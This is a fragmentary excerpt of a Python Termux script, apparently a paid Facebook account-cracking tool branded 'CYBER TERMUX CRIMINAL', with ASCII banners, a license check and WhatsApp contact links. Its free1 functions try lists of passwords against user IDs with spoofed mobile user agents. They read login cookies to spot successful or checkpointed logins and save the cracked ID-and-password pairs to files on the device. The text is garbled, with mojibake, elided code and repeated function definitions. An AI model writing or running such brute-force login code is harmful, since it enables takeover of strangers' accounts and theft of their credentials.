...
â•‘ Creator  : ZIHAD ISLAM                       â•‘
â•‘ Github   : CYBER-31  â•‘
â•‘ Facebook : ZIHAD ISLAM                          â•‘
â•‘ NOTE     :              Paid ToolðŸ˜“                         â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•   """
 
 
def linex():
    print(f'{RED}============================CYBERTERMUXCRIMINAL==============================')
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : ZIHAD ISLAM MEHEDI  ")
    print("\t  Fb gurup  : CYBER TERMUX CRIMINAL  ")
    print("\t  Github   : CYBER-31")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=CYBER"
        print("\n\t     [ Hello User ]\n")
        ...
        print(" otherwise msg on this whatsapp 01875525411 \n")
...
â•‘ Creator  : ZIHAD ISLAM                                 â•‘
â•‘ Github   : CYBER-31 â•‘
â•‘ Facebook : ZIHAD ISLAM MEHEDI ðŸ™‚â¤ï¸                â•‘
â•‘ Brothers :            ZIHAD YT                              â•‘
â•‘ NOTE     :   Paid ToolðŸ˜“                                    â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  """)                                           
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+8801875525411')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def menu_apikey():
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/link.chidaiya.lav.nai.abal.not");xyz()
    elif hamii in ["3","03"]:
        os.system("xdg-open https://wa.me/+01875525411")
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[CYBER-70-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/CYBER-70-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[CYBER-70] '+uid+' [~] '+ps+' ')
                    open('/sdcard/CYBER-70.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[CYBER-70-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/CYBER-70-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[CYBER-70 ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[CYBER-70 ðŸ”¥] [%s] \33[1;97m[OK:%s{CYBER-702}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
